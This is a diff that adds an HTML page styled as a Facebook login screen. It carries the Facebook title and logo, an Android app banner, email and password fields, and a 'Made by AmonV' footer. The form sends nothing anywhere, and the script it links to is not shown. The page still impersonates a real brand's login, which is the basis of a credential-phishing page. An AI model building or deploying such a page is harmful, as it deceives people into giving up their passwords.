@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <link rel="stylesheet" href="style.css" type="text/css" media="all">
+    <script src="script.js"></script>
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            padding: 0;
+        }
+
+        div {
+            background: #FFFFFF;
+            width: 400px;
+            height: auto;
+            border-radius: 20px;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .container {
+            background: #F0F2F5;
+            width: 500px;
+            height: auto;
+            border-radius: 20px;
+            padding: 20px;
+            text-align: center;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        #d {
+            font-size: 35px;
+            background: #FFFBE2;
+            margin-bottom: 20px;
+        }
+
+        #dd {
+            font-size: 50px;
+            margin-bottom: 10px;
+        }
+
+        img.android {
+            width: 150px;
+            margin-top: 20px;
+            margin-bottom: 10px;
+        }
+
+        img.facebook {
+            width: 200px;
+            margin-bottom: 5px;
+        }
+
+        input[type=text],
+        input[type=password] {
+            padding: 10px;
+            width: 90%;
+            margin-bottom: 10px;
+            border-radius: 10px;
+            font-size: 16px;
+            text-align: left;
+            background: #F5F6F8;
+        }
+
+        #signin {
+            color: #FFFFFF;
+            background: #1878F3;
+            padding: 15px;
+            width: 90%;
+            margin-bottom: 10px;
+            border-radius: 10px;
+            font-size: 20px;
+            text-align: center;
+        }
+
+        #f {
+            color: #1878F3;
+            font-size: 20px;
+            margin-bottom: 10px;
+        }
+
+        #account {
+            font-size: 20px;
+            border: 2px solid #d4d6d8;
+            display: inline-block;
+            color: #020202;
+            padding: 10px;
+            margin-bottom: 10px;
+            border-radius: 20px;
+        }
+
+        footer {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #777777;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div>
+            <p id="d"><span id="dd"><img src="img/android.png" alt="android" class="android"></span>Get Facebook for
+                android and browse faster</p>
+            <img src="img/Facebook-Logo.wine.svg" alt="facebook" class="facebook" />
+            <form action="" method="get" accept-charset="UTF-8">
+                <input type="text" name="username" id="username" placeholder="Email address or mobile number" />
+                <input type="password" name="password" id="password" placeholder="Password" />
+                <br />
+                <input type="button" name="signin" id="signin" value="Log in" />
+            </form>
+            <p id="f">forgotten password?</p>
+            <p id="account">Create account</p>
+        </div>
+    </div>
+    <footer>
+        Made by AmonV
+    </footer>
+</body>
+
+</html>
